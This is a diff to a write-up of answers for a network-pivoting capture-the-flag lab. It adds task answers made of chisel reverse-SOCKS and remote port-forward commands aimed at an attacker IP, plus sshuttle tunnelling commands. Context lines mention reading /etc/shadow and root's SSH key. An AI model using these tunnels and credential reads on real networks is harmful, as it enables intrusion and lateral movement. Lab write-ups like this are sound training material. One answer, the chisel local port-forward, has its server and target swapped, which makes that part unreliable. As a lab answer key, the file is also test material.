@@ -6,7 +6,8 @@ Difficulty: Easy
 
 Description: Learn how to pivot through a network by compromising a public facing web machine and tunnelling your traffic to access other machines in Wreath's network.
 
-Note: Not all tasks have questions that require answers and so those tasks are not listed here.
+## Task 1 -4
+Have no questions that require an answer.
 
 ## Task 5 - Webserver Enumeration
 We always start with an nmap scan since it may take awhile to complete.
@@ -141,6 +142,10 @@ We cat out the /etc/shadow file
 
 /root/.ssh/id_rsa
 
+## Task 7
+
+Has no question that requires an answer.
+
 ## Task 8 - Pivoting High-level Overview
 
 **Which type of pivoting creates a channel through which information can be sent hidden inside another protocol?**
@@ -233,4 +238,42 @@ reuseaddr
 
 ## Task 14 - Pivoting Chisel
 
-**
+**Use port 4242 for the listener and do not background the process.**
+
+./chisel server -p 4242 --reverse
+
+**What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is 172.16.0.200 and backgrounding the process?**
+
+./chisel client 172.16.0.200:4242 R:socks &
+
+**How would you forward 172.16.0.100:3306 to your own port 33060 using a chisel remote port forward, assuming your own IP is 172.16.0.200 and the listening port is 1337? Background this process.**
+
+./chisel client 172.16.0.200:1337 R:33060:172.16.0.100:3306 &
+
+**If you have a chisel server running on port 4444 of 172.16.0.5, how could you create a local portforward, opening port 8000 locally and linking to 172.16.0.10:80?**
+
+./chisel client 172.16.0.10:80 8000:172.16.0.5:4444
+
+## Task 15 - Pivoting sshuttle
+
+**How would you use sshuttle to connect to 172.16.20.7, with a username of "pwned" and a subnet of 172.16.0.0/16**
+
+sshuttle -r pwned@172.16.20.7 172.16.0.0/16
+
+**What switch (and argument) would you use to tell sshuttle to use a keyfile called "priv_key" located in the current directory?**
+
+--ssh-cmd "ssh -i priv_key"
+
+**You are trying to use sshuttle to connect to 172.16.0.100.  You want to forward the 172.16.0.x/24 range of IP addreses, but you are getting a Broken Pipe error.**
+
+**What switch (and argument) could you use to fix this error?**
+
+-x 172.16.0.100
+
+## Task 16 - Conclusion
+
+Has no questions that require an answer.
+
+## Task 17 - Git Server Enumeration
+
+
